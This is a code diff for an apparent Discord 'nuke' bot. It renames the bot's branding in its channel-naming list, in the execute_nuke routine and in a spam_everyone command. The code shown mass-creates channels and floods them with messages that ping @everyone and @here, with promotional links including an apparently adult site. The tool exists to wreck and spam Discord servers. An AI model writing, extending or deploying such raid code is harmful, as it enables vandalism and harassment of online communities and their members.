@@ -172,7 +172,7 @@ ROAST_LINES = [
 ]
 
 NUKE_CHANNEL_NAMES = [
-    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾𝕒𝕞𝕚𝕟𝕘 𝔸𝕔𝕒𝕕𝕖𝕞𝕪 𝕍ℕ",
+    "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔾̴𝔾̶.̴𝕂̶ℤ̶3̸ℕ̵/̵𝕂̵ℤ̵4̸ℕ̷ – ℍ𝕆𝕋 𝕎𝔸ℝ 𝔹𝕆𝕋",
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝔸̉𝕆 𝔻𝔼̣ℙ ℤ𝔸𝕀",
     "☠️ℕ𝕌𝕂𝔼 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝕆ℕ 𝕋𝕆ℙ",
     "☠️𝔻𝔼𝕋ℝ𝕆𝕐𝔼𝔻 𝔹𝕐 𝔹𝕆𝕋 ℕ𝕌𝕂𝔼 𝔼ℤ 𝕋𝕆ℙ",
@@ -282,11 +282,11 @@ async def execute_nuke(guild):
         created_channels = await asyncio.gather(*create_tasks, return_exceptions=True)
 
         spam_content = (
-            "# DETROYED BY BOSS BẢO ĐZ AND Gaming Academy VN ●'◡'●)\n"
+            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT ●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             '"|| link support 1 ||: https://xnhau.pics/"\n'
-            ' "|| link support 2 ||:https://discord.gg/gaming-academy-vn-1200447439648325713"'
+            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
         )
         
         valid_channels = [ch for ch in created_channels if isinstance(ch, discord.TextChannel)]
@@ -701,11 +701,11 @@ async def spam_channels_error(ctx, error):
 async def spam_everyone(ctx):
     try:
         spam_content = (
-            "# DETROYED BY BOSS BẢO ĐZ AND Gaming Academy VN ●'◡'●)\n"
+            "# DETROYED BY BOSS BẢO ĐZ AND G̴G̶.̴K̶Z̶3̸N̵/̵K̵Z̵4̸N̷ – HOT WAR BOT(●'◡'●)\n"
             "|| @everyone||\n"
             "|| @here ||\n"
             '"|| link support 1 ||: https://xnhau.pics/"\n'
-            ' "|| link support 2 ||:https://discord.gg/gaming-academy-vn-1200447439648325713"'
+            ' "|| link support 2 ||:https://discord.gg/4wrsMbRVpU"'
         )
         embed = discord.Embed(
             title="🚀 🌈 **KÍCH HOẠT SPAM @EVERYONE** 🌈",
